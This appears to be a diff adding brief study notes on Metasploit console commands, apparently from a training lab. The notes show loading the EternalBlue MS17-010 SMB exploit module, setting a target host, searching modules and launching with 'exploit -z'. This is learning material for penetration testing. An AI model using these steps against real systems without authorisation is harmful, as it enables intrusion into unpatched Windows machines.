@@ -1,0 +1,21 @@
+msfconsole
+
+
+msf6 > help set
+msf6 > history 
+msf6 > use exploit/windows/smb/ms17_010_eternalblue 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+msf6 exploit(windows/smb/ms17_010_eternalblue) > info
+msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
+msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
+	
+	The setg command sets a global value that will be used until you exit Metasploit or clear it using the unsetg command.
+
+msf6 > search ms17-010
+msf6 > search type:auxiliary telnet
+
+exploit -z command will run the exploit and background the session as soon as it opens.
